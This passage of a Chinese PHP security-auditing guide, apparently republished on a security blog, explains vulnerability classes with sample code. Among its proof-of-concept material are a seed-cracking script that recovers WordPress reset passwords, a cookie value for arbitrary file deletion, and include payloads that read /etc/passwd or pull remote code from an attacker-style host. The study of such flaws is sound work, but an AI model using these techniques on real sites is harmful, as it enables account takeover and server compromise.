+		<tr>
+			<td>
+				PHP版本要求：php4和php&lt;5.2.1
+md5-9f2f1d115a7b72c89ed0cc63ef8f6e45
+			</td>
+		</tr>
+	</tbody>
+</table>
+<p>
+	<strong>2)当magic<em>quotes</em>gpc = Off时，在php5.24下测试显示：</strong> 
+</p>
+<pre class="prettyprint lang-php">aaaa'aaa
+bb'b </pre>
+<p>
+	对于magic<em>quotes</em>gpc = Off时所有的变量都是不安全的，考虑到这个，很多程序都通过addslashes等函数来实现魔术引号对变量的过滤，示例代码如下：
+</p>
+<pre class="prettyprint lang-php">&lt;?php 
+//keyvul.php?aaa'aa=1'
+//magic_quotes_gpc = Off
+ if (!get_magic_quotes_gpc())
+{
+ $_GET  = addslashes_array($_GET);
+}
+
+function addslashes_array($value)
+{
+        return is_array($value) ? array_map('addslashes_array', $value) : addslashes($value);
+}
+print_R($_GET);
+foreach ($_GET AS $key =&gt; $value)
+{
+        print $key;
+}
+?&gt; </pre>
+<p>
+	以上的代码看上去很完美，但是他这个代码里addslashes($value)只处理了变量的具体的值，但是没有处理变量本身的key，上面的代码显示结果如下：
+</p>
+<pre class="prettyprint lang-php">Array
+(
+    [aaa'aa] =&gt; 1\'
+)
+aaa'aa </pre>
+<table border="1" cellspacing="0" cellpadding="1" width="100%">
+	<tbody>
+		<tr>
+			<td>
+				漏洞审计策略
+			</td>
+		</tr>
+		<tr>
+			<td>
+				PHP版本要求：无
+md5-9f2f1d115a7b72c89ed0cc63ef8f6e45
+			</td>
+		</tr>
+	</tbody>
+</table>
+<h4>
+	代码注射
+</h4>
+<h5>
+	PHP中可能导致代码注射的函数
+</h5>
+<p>
+	很多人都知道eval、preg_replace+/e可以执行代码，但是不知道php还有很多的函数可以执行代码如：
+</p>
+<pre class="prettyprint lang-php">assert()
+call_user_func()
+call_user_func_array()
+create_function()
+变量函数
+... </pre>
+<p>
+	这里我们看看最近出现的几个关于create_function()代码执行漏洞的代码：
+</p>
+<pre class="prettyprint lang-php">&lt;?php
+//how to exp this code
+$sort_by=$_GET['sort_by'];
+$sorter='strnatcasecmp';
+$databases=array('test','test');
+$sort_function = '  return 1 * ' . $sorter . '($a["' . $sort_by . '"], $b["' . $sort_by . '"]);
+              ';
+usort($databases, create_function('$a, $b', $sort_function)); </pre>
+<table border="1" cellspacing="0" cellpadding="1" width="100%">
+	<tbody>
+		<tr>
+			<td>
+				漏洞审计策略
+			</td>
+		</tr>
+		<tr>
+			<td>
+				PHP版本要求：无
+md5-0232e542bbb413c6eee26d4a4b697547
+			</td>
+		</tr>
+	</tbody>
+</table>
+<h5>
+	变量函数与双引号
+</h5>
+<p>
+	对于单引号和双引号的区别，很多程序员深有体会，示例代码：
+</p>
+<pre class="prettyprint lang-php">echo "$a\n";
+echo '$a\n'; </pre>
+<p>
+	我们再看如下代码：
+</p>
+<pre class="prettyprint lang-php">//how to exp this code
+if($globals['bbc_email']){
+
+$text = preg_replace(
+                array("/\[email=(.*?)\](.*?)\[\/email\]/ies",
+                                "/\[email\](.*?)\[\/email\]/ies"),
+                array('check_email("$1", "$2")',
+                                'check_email("$1", "$1")'), $text); </pre>
+<p>
+	另外很多的应用程序都把变量用""存放在缓存文件或者config或者data文件里，这样很容易被人注射变量函数。
+</p>
+<table border="1" cellspacing="0" cellpadding="1" width="100%">
+	<tbody>
+		<tr>
+			<td>
+				漏洞审计策略
+			</td>
+		</tr>
+		<tr>
+			<td>
+				PHP版本要求：无
+md5-9f2f1d115a7b72c89ed0cc63ef8f6e45
+			</td>
+		</tr>
+	</tbody>
+</table>
+<h4>
+	PHP自身函数漏洞及缺陷
+</h4>
+<h5>
+	PHP函数的溢出漏洞
+</h5>
+<p>
+	大家还记得Stefan Esser大牛的Month of PHP Bugs（MOPB见附录2）项目么，其中比较有名的要算是unserialize()，代码如下：
+</p>
+<p>
+	<code>unserialize(stripslashes($HTTP_COOKIE_VARS[$cookiename . '_data']);</code> 
+</p>
+<p>
+	在以往的PHP版本里，很多函数都曾经出现过溢出漏洞，所以我们在审计应用程序漏洞的时候不要忘记了测试目标使用的PHP版本信息。
+</p>
+<table border="1" cellspacing="0" cellpadding="1" width="100%">
+	<tbody>
+		<tr>
+			<td>
+				漏洞审计策略
+			</td>
+		</tr>
+		<tr>
+			<td>
+				PHP版本要求：对应fix的版本
+md5-79c2cd2b05e4468ae477ea741f08d9fa
+			</td>
+		</tr>
+	</tbody>
+</table>
+<h5>
+	PHP函数的其他漏洞
+</h5>
+<p>
+	Stefan Esser大牛发现的漏洞：unset()--Zend<em>Hash</em>Del<em>Key</em>Or_Index Vulnerability 比如phpwind早期的serarch.php里的代码：
+</p>
+<pre class="prettyprint lang-php">unset($uids);
+......
+$query=$db-&gt;query("SELECT uid FROM pw_members WHERE username LIKE '$pwuser'");
+while($member=$db-&gt;fetch_array($query)){
+        $uids .= $member['uid'].',';
+}
+$uids ? $uids=substr($uids,0,-1) : $sqlwhere.=' AND 0 ';
+........
+$query = $db-&gt;query("SELECT DISTINCT t.tid FROM $sqltable WHERE $sqlwhere $orderby $limit"); </pre>
+<table border="1" cellspacing="0" cellpadding="1" width="100%">
+	<tbody>
+		<tr>
+			<td>
+				漏洞审计策略
+			</td>
+		</tr>
+		<tr>
+			<td>
+				PHP版本要求：php4&lt;4.3 php5&lt;5.14
+md5-ad283522b4fbbd41440392a41edc3d75
+			</td>
+		</tr>
+	</tbody>
+</table>
+<h5>
+	session_destroy()删除文件漏洞
+</h5>
+<p>
+	测试PHP版本：5.1.2 这个漏洞是几年前朋友saiy发现的，session_destroy()函数的功能是删除session文件，很多web应用程序的logout的功能都直接调用这个函数删除session，但是这个函数在一些老的版本中缺少过滤导致可以删除任意文件。测试代码如下：
+</p>
+<pre class="prettyprint lang-php">&lt;?php 
+//val.php   
+session_save_path('./');
+session_start();
+if($_GET['del']) {
+        session_unset();
+        session_destroy();
+}else{
+        $_SESSION['hei']=1;
+        echo(session_id());
+        print_r($_SESSION);
+}
+?&gt; </pre>
+<p>
+	当我们提交构造cookie:PHPSESSID=/../1.php，相当于unlink('sess_/../1.php')这样就通过注射../转跳目录删除任意文件了。很多著名的程序某些版本都受影响如phpmyadmin，sablog，phpwind3等等。
+</p>
+<table border="1" cellspacing="0" cellpadding="1" width="100%">
+	<tbody>
+		<tr>
+			<td>
+				漏洞审计策略
+			</td>
+		</tr>
+		<tr>
+			<td>
+				PHP版本要求：具体不详
+md5-5cfddd64912ab1357091e5775f2ee5be
+			</td>
+		</tr>
+	</tbody>
+</table>
+<h5>
+	随机函数
+</h5>
+<p>
+	<strong>1) rand() VS mt_rand()</strong> 
+</p>
+<pre class="prettyprint lang-php">&lt;?php
+//on windows
+print mt_getrandmax(); //2147483647
+print getrandmax();// 32767
+?&gt; </pre>
+<p>
+	可以看出rand()最大的随机数是32767，这个很容易被我们暴力破解。
+</p>
+<pre class="prettyprint lang-php">&lt;?php
+$a= md5(rand());
+for($i=0;$i&lt;=32767;$i++){
+  if(md5($i) ==$a ) {
+   print $i."--&gt;ok!!&lt;br&gt;";exit;
+   }else { print $i."&lt;br&gt;";}
+}
+?&gt; </pre>
+<p>
+	当我们的程序使用rand处理session时，攻击者很容易暴力破解出你的session，但是对于mt_rand是很难单纯的暴力的。
+</p>
+<table border="1" cellspacing="0" cellpadding="1" width="100%">
+	<tbody>
+		<tr>
+			<td>
+				漏洞审计策略
+			</td>
+		</tr>
+		<tr>
+			<td>
+				PHP版本要求：无
+md5-ab6d55d013a366bf4c6e8583d6212014
+			</td>
+		</tr>
+	</tbody>
+</table>
+<p>
+	<strong>2) mt_srand()/srand()-weak seeding（by Stefan Esser）</strong> 
+</p>
+<p>
+	看php手册里的描述：
+</p>
+<p>
+	<code>mt_srand</code> <code>(PHP 3 &gt;= 3.0.6, PHP 4, PHP 5)</code> 
+</p>
+<p>
+	mt_srand -- 播下一个更好的随机数发生器种子。说明
+</p>
+<p>
+	<code>void mt_srand ( int seed )</code> 
+</p>
+<p>
+	用 seed 来给随机数发生器播种。从 PHP 4.2.0 版开始，seed 参数变为可选项，当该项为空时，会被设为随时数。
+</p>
+<p>
+	例子 1. mt_srand() 范例
+</p>
+<pre class="prettyprint lang-php">&lt;?php
+// seed with microseconds
+function make_seed()
+{
+    list($usec, $sec) = explode(' ', microtime());
+    return (float) $sec + ((float) $usec * 100000);
+}
+mt_srand(make_seed());
+$randval = mt_rand();
+?&gt; </pre>
+<p>
+	注: 自 PHP 4.2.0 起，不再需要用 srand() 或 mt_srand() 函数给随机数发生器播种，现已自动完成。
+</p>
+<p>
+	php从4.2.0开始实现了自动播种，但是为了兼容，后来使用类似于这样的代码播种：
+</p>
+<p>
+	<code>mt_srand ((double) microtime() * 1000000)</code> 
+</p>
+<p>
+	但是使用(double)microtime()*1000000类似的代码seed是比较脆弱的：
+</p>
+<p>
+	<code>0&lt;(double) microtime()&lt;1 ---&gt; 0&lt;(double) microtime()* 1000000&lt;1000000</code> 
+</p>
+<p>
+	那么很容易暴力破解,测试代码如下：
+</p>
+<pre class="prettyprint lang-php">&lt;?php
+/////////////////
+//&gt;php rand.php
+//828682
+//828682
+////////////////
+ini_set("max_execution_time",0);
+$time=(double) microtime()* 1000000;
+print $time."\n";
+mt_srand ($time);
+
+$search_id = mt_rand();
+$seed = search_seed($search_id);
+print $seed;
+function search_seed($rand_num) {
+$max = 1000000;
+for($seed=0;$seed&lt;=$max;$seed++){
+        mt_srand($seed);
+        $key = mt_rand();
+        if($key==$rand_num) return $seed;
+}
+return false;
+}
+?&gt; </pre>
+<p>
+	从上面的代码实现了对seed的破解，另外根据Stefan Esser的分析seed还根据进程变化而变化，换句话来说同一个进程里的seed是相同的。 然后同一个seed每次mt_rand的值都是特定的。如下图：
+</p>
+<pre class="prettyprint lang-php">seed-A
+mt_rand-A-1
+mt_rand-A-2
+mt_rand-A-3
+
+seed-B
+mt_rand-B-1
+mt_rand-B-2
+mt_rand-B-3 </pre>
+<p>
+	对于seed-A里mt<em>rand-1/2/3都是不相等的，但是值都是特定的，也就是说当seed-A等于seed-B，那么mt</em>rand-A-1就等于mt<em>rand-B-1…，这样我们只要能够得到seed就可以得到每次mt</em>rand的值了。
+</p>
+<p>
+	对于5.2.6&gt;php&gt;4.2.0直接使用默认播种的程序也是不安全的（很多的安全人员错误的以为这样就是安全的），这个要分两种情况来分析：
+</p>
+<ul>
+	<li>
+		第一种：'Cross Application Attacks'，这个思路在Stefan Esser文章里有提到，主要是利用其他程序定义的播种（如mt_srand ((double) microtime()* 1000000)），phpbb+wordpree组合就存在这样的危险.
+	</li>
+	<li>
+		<p>
+			第二种：5.2.6&gt;php&gt;4.2.0默认播种的算法也不是很强悍，这是Stefan Esser的文章里的描述：
+		</p>
+	</li>
+	<li>
+		<p>
+			The Implementation
+		</p>
+	</li>
+	<li>
+		<ul>
+			<li>
+				When mt<em>rand() is seeded internally or by a call to mt</em>srand() PHP 4 and PHP 5 &lt;= 5.2.0 force the lowest bit to 1. Therefore the strength of the seed is only 31 and not 32 bits. In PHP 5.2.1 and above the implementation of the Mersenne Twister was changed and the forced bit removed.
+			</li>
+		</ul>
+	</li>
+</ul>
+<p>
+	在32位系统上默认的播种的种子为最大值是2^32，这样我们循环最多2^32次就可以破解seed。而在PHP 4和PHP 5 &lt;= 5.2.0 的算法有个bug：奇数和偶数的播种是一样的（详见附录3）,测试代码如下：
+</p>
+<pre class="prettyprint lang-php">&lt;?php
+mt_srand(4); 
+$a = mt_rand(); 
+mt_srand(5); 
+$b = mt_rand();
+print $a."\n".$b;
+?&gt; </pre>
+<p>
+	通过上面的代码发现$a==$b，所以我们循环的次数为232/2=231次。我们看如下代码：
+</p>
+<pre class="prettyprint lang-php">&lt;?php
+//base on http://www.milw0rm.com/exploits/6421 
+//test on php 5.2.0
+
+define('BUGGY', 1); //上面代码$a==$b时候定义BUGGY=1
+
+$key = wp_generate_password(20, false);
+echo $key."\n";
+$seed = getseed($key);
+print $seed."\n"; 
+
+mt_srand($seed);
+$pass = wp_generate_password(20, false);
+echo $pass."\n";        
+
+function wp_generate_password($length = 12, $special_chars = true) {
+        $chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
+        if ( $special_chars )
+                $chars .= '!@#$%^&amp;*()';
+
+        $password = '';
+        for ( $i = 0; $i &lt; $length; $i++ )
+                $password .= substr($chars, mt_rand(0, strlen($chars) - 1), 1);
+        return $password;
+} 
+
+function getseed($resetkey) {
+        $max = pow(2,(32-BUGGY));
+        for($x=0;$x&lt;=$max;$x++) {
+                $seed = BUGGY ? ($x &lt;&lt; 1) + 1 : $x; 
+                mt_srand($seed);
+                $testkey = wp_generate_password(20,false);
+                if($testkey==$resetkey) { echo "o\n"; return $seed; }
+
+                if(!($x % 10000)) echo $x / 10000;
+        }
+        echo "\n";
+        return false;
+}
+?&gt; </pre>
+<p>
+	运行结果如下：
+</p>
+<pre class="prettyprint lang-php">php5&gt;php rand.php
+M8pzpjwCrvVt3oobAaOr
+0123456789101112131415161718192021222324252627282930313233343536373839404142434
+445464748495051525354555657585960616263646566676869
+7071727374757677787980818283848586878889909192939495969798991001011021031041051
+061071081091101111121131141151161171181191201211221
+2312412512612712812913013113213313413513613713813914014114214314414514614714814
+915015115215315415515615715815916016116216316416516
+6167168169170171172173174175176177178179180181182183184185186187188189190191192
+193194195196197198199200201202203204205206207208209
+2102112122132142152162172182192202212222232242252262272282292302312322332342352
+362372382392402412422432442452462472482492502512522
+..............01062110622106231062410625106261062710628106291063010631106321063
+3o
+70693
+pjwCrvVt3oobAaOr </pre>
+<p>
+	当10634次时候我们得到了结果。
+</p>
+<p>
+	当PHP版本到了5.2.1后，通过修改算法修补了奇数和偶数的播种相等的问题，这样也导致了php5.2.0前后导致同一个播种后的mt_rand()的值不一样。比如：
+</p>
+<pre class="prettyprint lang-php">&lt;?php
+mt_srand(42);
+echo mt_rand();
+//php&lt;=5.20 1387371436
+//php&gt;5.20 1354439493           
+?&gt; </pre>
+<p>
+	正是这个原因，也要求了我们的exp的运行环境：当目标&gt;5.20时候，我们exp运行的环境也要是&gt;5.20的版本，反过来也是一样。
+</p>
+<p>
+	从上面的测试及分析来看，php&lt;5.26不管有没有定义播种，mt<em>rand处理的数据都是不安全的。在web应用里很多都使用mt</em>rand来处理随机的session，比如密码找回功能等等，这样的后果就是被攻击者恶意利用直接修改密码。
+</p>
+<p>
+	很多著名的程序都产生了类似的漏洞如wordpress、phpbb、punbb等等。（在后面我们将实际分析下国内著名的bbs程序Discuz!的mt_srand导致的漏洞）
+</p>
+<table border="1" cellspacing="0" cellpadding="1" width="100%">
+	<tbody>
+		<tr>
+			<td>
+				漏洞审计策略
+			</td>
+		</tr>
+		<tr>
+			<td>
+				PHP版本要求：php4 php5&lt;5.2.6
+md5-e5f53bc4e451a67ad5c30ecea9547c87
+			</td>
+		</tr>
+	</tbody>
+</table>
+<h4>
+	特殊字符
+</h4>
+<p>
+	其实“特殊字符”也没有特定的标准定义，主要是在一些code hacking发挥着特殊重作用的一类字符。下面就举几个例子：
+</p>
+<h5>
+	截断
+</h5>
+<p>
+	其中最有名的数大家都熟悉的null字符截断。
+</p>
+<h6>
+	include截断
+</h6>
+<pre class="prettyprint lang-php">&lt;?php 
+include $_GET['action'].".php"; 
+?&gt; </pre>
+<p>
+	提交"action=/etc/passwd%00"中的"%00"将截断后面的".php"，但是除了"%00"还有没有其他的字符可以实现截断使用呢？肯定有人想到了远程包含的url里问号“?”的作用，通过提交"action=http://www.hacksite.com/evil-code.txt?"这里“?”实现了“伪截断”：），好象这个看上去不是那么舒服那么我们简单写个代码fuzz一下：
+</p>
+<pre class="prettyprint lang-php">&lt;?php
+////////////////////
+////var5.php代码:
+////include $_GET['action'].".php"; 
+////print strlen(realpath("./"))+strlen($_GET['action']);  
+///////////////////
+ini_set('max_execution_time', 0);
+$str='';
+for($i=0;$i&lt;50000;$i++)
+{
+        $str=$str."/";
+
+        $resp=file_get_contents('http://127.0.0.1/var/var5.php?action=1.txt'.$str);
+        //1.txt里的代码为print 'hi';
+        if (strpos($resp, 'hi') !== false){
+                print $i;
+                exit;
+        }
+}
+?&gt; </pre>
+<p>
+	经过测试字符“.”、“ /”或者2个字符的组合，在一定的长度时将被截断，win系统和*nix的系统长度不一样，当win下strlen(realpath("./"))+strlen($_GET['action'])的长度大于256时被截断，对于*nix的长度是4 * 1024 = 4096。对于php.ini里设置远程文件关闭的时候就可以利用上面的技巧包含本地文件了。（此漏洞由cloie#ph4nt0m.org最先发现]）
+</p>
+<h6>
+	数据截断
+</h6>
+<p>
+	对于很多web应用文件在很多功能是不容许重复数据的，比如用户注册功能等。一般的应用程序对于提交注册的username和数据库里已有的username对比是不是已经有重复数据，然而我们可以通过“数据截断”等来饶过这些判断，数据库在处理时候产生截断导致插入重复数据。
+</p>
+<p>
+	<strong>1) Mysql SQL Column Truncation Vulnerabilities</strong> 
+</p>
+<p>
+	这个漏洞又是大牛Stefan Esser发现的（Stefan Esser是我的偶像:)），这个是由于mysql的sql<em>mode设置为default的时候，即没有开启STRICT</em>ALL_TABLES选项时，MySQL对于插入超长的值只会提示warning，而不是error（如果是error就插入不成功），这样可能会导致一些截断问题。测试如下：
+</p>
+<pre class="prettyprint lang-php">mysql&gt; insert into truncated_test(`username`,`password`) values("admin","pass");
+
+mysql&gt; insert into truncated_test(`username`,`password`) values("admin           x", "new_pass");
+Query OK, 1 row affected, 1 warning (0.01 sec)
+
+mysql&gt; select * from truncated_test;
++----+------------+----------+
+| id | username   | password |
++----+------------+----------+
+| 1 | admin      | pass     |
+| 2 | admin      | new_pass |
++----+------------+----------+
+2 rows in set (0.00 sec) </pre>
+<p>
+	<strong>2) Mysql charset Truncation vulnerability</strong> 
+</p>
+<p>
+	这个漏洞是80sec发现的，当mysql进行数据存储处理utf8等数据时对某些字符导致数据截断。测试如下：
+</p>
+<pre class="prettyprint lang-php">mysql&gt; insert into truncated_test(`username`,`password`) values(concat("admin",0xc1), "new_pass2");
+Query OK, 1 row affected, 1 warning (0.00 sec)
+
+mysql&gt; select * from truncated_test;
++----+------------+----------+
+| id | username   | password |
++----+------------+----------+
+| 1 | admin      | pass      |
+| 2 | admin      | new_pass  |
+| 3 | admin      | new_pass2 |
++----+------------+----------+
+2 rows in set (0.00 sec) </pre>
+<p>
+	很多的web应用程序没有考虑到这些问题，只是在数据存储前简单查询数据是否包含相同数据，如下代码：
+</p>
+<pre class="prettyprint lang-php">$result = mysql_query("SELECT * from test_user where user='$user' ");
+  ....
+if(@mysql_fetch_array($result, MYSQL_NUM)) {
+        die("already exist");
+} </pre>
+<table border="1" cellspacing="0" cellpadding="1" width="100%">
+	<tbody>
+		<tr>
+			<td>
+				漏洞审计策略
+			</td>
+		</tr>
+		<tr>
+			<td>
+				PHP版本要求：无
+md5-9f2f1d115a7b72c89ed0cc63ef8f6e45
+			</td>
+		</tr>
+	</tbody>
+</table>
+<h6>
+	文件操作里的特殊字符
+</h6>
+<p>
+	文件操作里有很多特殊的字符，发挥特别的作用，很多web应用程序没有注意处理这些字符而导致安全问题。比如很多人都知道的windows系统文件名对“空格”和“.”等的忽视，这个主要体现在上传文件或者写文件上，导致直接写webshell。另外对于windows系统对“...\”进行系统转跳等等。 下面还给大家介绍一个非常有意思的问题：
+</p>
+<pre class="prettyprint lang-php">//Is this code vul?
+if( eregi(".php",$url) ){
+        die("ERR");
+}
+$fileurl=str_replace($webdb[www_url],"",$url);
+.....
+header('Content-Disposition: attachment; filename='.$filename); </pre>
+<p>
+	很多人看出来了上面的代码的问题，程序首先禁止使用“.php”后缀。但是下面居然接了个str<em>replace替换$webdbwww</em>url为空，那么我们提交“.p$webdbwww_urlhp”就可以饶过了。那么上面的代码杂fix呢？有人给出了如下代码：
+</p>
+<pre class="prettyprint lang-php">$fileurl=str_replace($webdb[www_url],"",$url);
+if( eregi(".php",$url) ){
+        die("ERR");
+} </pre>
+<p>
+	str<em>replace提到前面了，很完美的解决了str</em>replace代码的安全问题，但是问题不是那么简单，上面的代码在某些系统上一样可以突破。接下来我们先看看下面的代码：
+</p>
+<pre class="prettyprint lang-php">&lt;?php
+for($i=0;$i&lt;255;$i++) {
+        $url = '1.ph'.chr($i);
+        $tmp = @file_get_contents($url);
+        if(!empty($tmp)) echo chr($i)."\r\n";
+}  
+?&gt; </pre>
+<p>
+	我们在windows系统运行上面的代码得到如下字符* &lt; &gt; ? P p都可以打开目录下的1.php。
+</p>
+<table border="1" cellspacing="0" cellpadding="1" width="100%">
+	<tbody>
+		<tr>
+			<td>
+				漏洞审计策略
+			</td>
+		</tr>
+		<tr>
+			<td>
+				PHP版本要求：无
+md5-eab7bef0c1900e1e0fd6d8c2ef28d4ef
+			</td>
+		</tr>
+	</tbody>
+</table>
+<h3>
+	怎么进一步寻找新的字典
+</h3>
+<p>
+	上面我们列举很多的字典，但是很多都是已经公开过的漏洞或者方式，那么我们怎么进一步找到新的字典或者利用方式呢？
+</p>
+<ul>
+	<li>
+		分析和学习别人发现的漏洞或者exp，总结出漏洞类型及字典
+	</li>
+	<li>
+		通过学习php手册或者官方文档,挖掘出新的有危害的函数或者利用方式
+	</li>
+	<li>
+		fuzz php的函数，找到新的有问题的函数（不一定非要溢出的），如上一章的4.6的部分很多都可以简单的fuzz脚本可以测试出来
+	</li>
+	<li>
+		分析php源代码，发现新的漏洞函数“特性”或者漏洞。（在上一节里介绍的那些“漏洞审计策略”里，都没有php源代码的分析，如果你要进一步找到新的字典，可以在php源代码的基础上分析下成因，然后根据这个成因来分析寻找新的漏洞函数“特性”或者漏洞。）（我们以后会陆续公布一些我们对php源代码的分析）
+	</li>
+	<li>
+		有条件或者机会和开发者学习，找到他们实现某些常用功能的代码的缺陷或者容易忽视的问题
+	</li>
+	<li>
+		你有什么要补充的吗？ ：）
+	</li>
+</ul>
+<h3>
+	DEMO
+</h3>
+<p>
+	DEMO -- Discuz! Reset User Password 0day Vulnerability 分析
+（Exp:<a href="http://sebug.net/vuldb/ssvid-17519">http://sebug.net/vuldb/ssvid-17519</a>）
+</p>
+<table border="1" cellspacing="0" cellpadding="1" width="100%">
+	<tbody>
+		<tr>
+			<td>
+				PHP版本要求:php4 php5&lt;5.2.6
+			</td>
+		</tr>
+		<tr>
+			<td>
+				系统要求: 无
+			</td>
+		</tr>
+		<tr>
+			<td>
+				审计策略:查找mt_srand/mt_rand
+			</td>
+		</tr>
+	</tbody>
+</table>
+<p>
+	第一步 安装Discuz! 6.1后利用grep查找mt_srand得到：
+</p>
+<pre class="prettyprint lang-php">heige@heige-desktop:~/dz6/upload$ grep -in 'mt_srand' -r ./ --colour -5
+./include/global.func.php-694-  $GLOBALS['rewritecompatible'] &amp;&amp; $name = rawurlencode($name);
+./include/global.func.php-695-  return '&lt;a href="tag-'.$name.'.html"'.stripslashes($extra).'&gt;';
+./include/global.func.php-696-}
+./include/global.func.php-697-
+./include/global.func.php-698-function random($length, $numeric = 0) {
+./include/global.func.php:699:  PHP_VERSION &lt; '4.2.0' &amp;&amp; mt_srand((double)microtime() * 1000000);
+./include/global.func.php-700-  if($numeric) {
+./include/global.func.php-701-          $hash = sprintf('%0'.$length.'d', mt_rand(0, pow(10, $length) - 1));
+./include/global.func.php-702-  } else {
+./include/global.func.php-703-          $hash = '';
+./include/global.func.php-704-          $chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789abcdefghijklmnopqrstuvwxyz';
+--
+./include/discuzcode.func.php-30-
+./include/discuzcode.func.php-31-if(!isset($_DCACHE['bbcodes']) || !is_array($_DCACHE['bbcodes']) || !is_array($_DCACHE['smilies'])) {
+./include/discuzcode.func.php-32-       @include DISCUZ_ROOT.'./forumdata/cache/cache_bbcodes.php';
+./include/discuzcode.func.php-33-}
+./include/discuzcode.func.php-34-
+./include/discuzcode.func.php:35:mt_srand((double)microtime() * 1000000);
+./include/discuzcode.func.php-36-
+./include/discuzcode.func.php-37-function attachtag($pid, $aid, &amp;$postlist) {
+./include/discuzcode.func.php-38-       global $attachrefcheck, $thumbstatus, $extcredits, $creditstrans, $ftp, $exthtml;
+./include/discuzcode.func.php-39-       $attach = $postlist[$pid]['attachments'][$aid];
+./include/discuzcode.func.php-40-       if($attach['attachimg']) { </pre>
+<p>
+	有两个文件用到了<code>mt_srand()</code>，第1是在<code>./include/global.func.php</code>的随机函数<code>random()</code>里：
+</p>
+<p>
+	<code>PHP_VERSION &lt; '4.2.0' &amp;&amp; mt_srand((double)microtime() * 1000000);</code> 
+</p>
+<p>
+	判断了版本，如果是<code>PHP_VERSION &gt; '4.2.0'</code>使用php本身默认的播种。从上一章里的分析我们可以看得出来，使用php本身默认的播种的分程序两种情况：
+</p>
+<p>
+	1) 'Cross Application Attacks' 这个思路是只要目标上有使用使用的程序里定义了类似<code>mt_srand((double)microtime() * 1000000)</code>的播种的话，又很有可能被暴力。在dz这里不需要Cross Application，因为他本身有文件就定义了，就是上面的第2个文件：
+</p>
+<p>
+	<code>./include/discuzcode.func.php:35:mt_srand((double)microtime() * 1000000);</code> 
+</p>
+<p>
+	这里我们肯定dz是存在这个漏洞的，文章给出来的exp也就是基于这个的。（具体exp利用的流程有兴趣的可以自己分析下]）
+</p>
+<p>
+	2) 有的人认为如果没有<code>mt_srand((double)microtime() * 1000000);</code>这里的定义，那么dz就不存在漏洞，这个是不正确的。首先你不可以保证别人使用的其他应用程序没有定义，再次不利用<code>'Cross Application Attacks'，5.2.6&gt;php&gt;4.2.0 php</code>本身默认播种的算法也不是很强悍（分析详见上），也是有可以暴力出来，只是速度要慢一点。
+</p>
+<h3>
+	后话
+</h3>
+<p>
+	本文是80vul的三大马甲：<code>80vul-A</code>，<code>80vul-B</code>，<code>80vul-C</code>集体智慧的结晶，尤其是80vul-B贡献了不少新发现。另外需要感谢的是文章里提到的那些漏洞的发现者，没有他们的成果也就没有本文。本文没有写“参考”，因为本文是一个总结性的文挡，有太多的连接需要提供限于篇幅就没有一一列举，有心的读者可以自行google。另外原本没有打算公布此文，因为里面包含了太多应用程序的0day，而且有太多的不尊重别人成果的人，老是利用从别人那学到的技术来炫耀，甚至牟取利益。在这里我们希望你可以在本文里学到些东西，更加希望如果通过本文你找到了某些应用程序的0day，请低调处理，或者直接提交给官方修补，谢谢大家！！
+</p>
+<p>
+	by <a href="http://sebug.net/lto?url=http://80vul.com" target="nw">http://80vul.com</a> 
+</p>
+<h3>
+	附录
+</h3>
+<ul>
+	<li>
+		<a href="http://sebug.net/lto?url=http://bbs.phpchina.com/attachment.php?aid=22294" target="nw">http://bbs.phpchina.com/attachment.php?aid=22294</a> 
+	</li>
+	<li>
+		<a href="http://sebug.net/lto?url=http://www.php-security.org/" target="nw">http://www.php-security.org/</a> 
+	</li>
+	<li>
+		<a href="http://sebug.net/lto?url=http://bugs.php.net/bug.php?id=40114" target="nw">http://bugs.php.net/bug.php?id=40114</a> 
+	</li>
+</ul>
+<hr />
+<p style="text-indent:2em;">
+	转自：<a href="http://sebug.net/node/t-45" target="_blank">http://sebug.net/node/t-45</a> 
+</p>
+<p><strong>留言评论（旧系统）：</strong></p>
+<div style="max-height:600px;width:100%;overflow:auto;overflow-x:hidden;">
+<blockquote id="1863,2600,59.60.248.103">
+<p>hookit @ 2012-06-21 13:03:21</p>
+<p style="text-indent:2em">挺早就看过了</p>
+<p>本站回复：</p>
+<p style="text-indent:2em">是的，去年的文章，转过来了……</p>
+</blockquote>
+</div>
+    </div>
+
+    
+    
+<div class="post-copyright">
+  <p class="copyright-item">
+    <span class="item-title">文章作者</span>
+    <span class="item-content">sebug.net</span>
+  </p>
+  <p class="copyright-item">
+    <span class="item-title">上次更新</span>
+    <span class="item-content">
+      2012-06-20
+      
+    </span>
+  </p>
+  
+  <p class="copyright-item">
+    <span class="item-title">许可协议</span>
+    <span class="item-content"><a href="https://lcx.cc/" target="_blank">Nuclear'Atk（核攻击）网络安全实验室</a>版权所有，转载请注明出处。</span>
+  </p>
+</div>
+
+
+    
+    
+
+    <footer class="post-footer">
+      <div class="post-tags">
+          <a href="https://lcx.cc/tags/php/">PHP</a>
+          <a href="https://lcx.cc/tags/%E7%A8%8B%E5%BA%8F/">程序</a>
+          <a href="https://lcx.cc/tags/%E6%8A%80%E6%9C%AF/">技术</a>
+          <a href="https://lcx.cc/tags/%E6%BC%8F%E6%B4%9E/">漏洞</a>
+          <a href="https://lcx.cc/tags/0day/">0day</a>
+          <a href="https://lcx.cc/tags/app/">app</a>
+          <a href="https://lcx.cc/tags/blog/">Blog</a>
+          <a href="https://lcx.cc/tags/bug/">bug</a>
+          <a href="https://lcx.cc/tags/cookie/">cookie</a>
+          <a href="https://lcx.cc/tags/discuz/">Discuz</a>
+          <a href="https://lcx.cc/tags/dz/">DZ</a>
+          <a href="https://lcx.cc/tags/exp/">EXP</a>
+          <a href="https://lcx.cc/tags/hash/">Hash</a>
+          <a href="https://lcx.cc/tags/html/">Html</a>
+          <a href="https://lcx.cc/tags/http/">HTTP</a>
+          <a href="https://lcx.cc/tags/ids/">IDS</a>
+          <a href="https://lcx.cc/tags/ie/">IE</a>
+          <a href="https://lcx.cc/tags/ip/">IP</a>
+          <a href="https://lcx.cc/tags/ips/">IPS</a>
+          <a href="https://lcx.cc/tags/md5/">MD5</a>
+          <a href="https://lcx.cc/tags/mssql/">mssql</a>
+          <a href="https://lcx.cc/tags/mysql/">Mysql</a>
+          <a href="https://lcx.cc/tags/net/">Net</a>
+          <a href="https://lcx.cc/tags/pos/">POS</a>
+          <a href="https://lcx.cc/tags/rat/">Rat</a>
+          <a href="https://lcx.cc/tags/sql/">SQL</a>
+          <a href="https://lcx.cc/tags/url/">URL</a>
+          <a href="https://lcx.cc/tags/web/">Web</a>
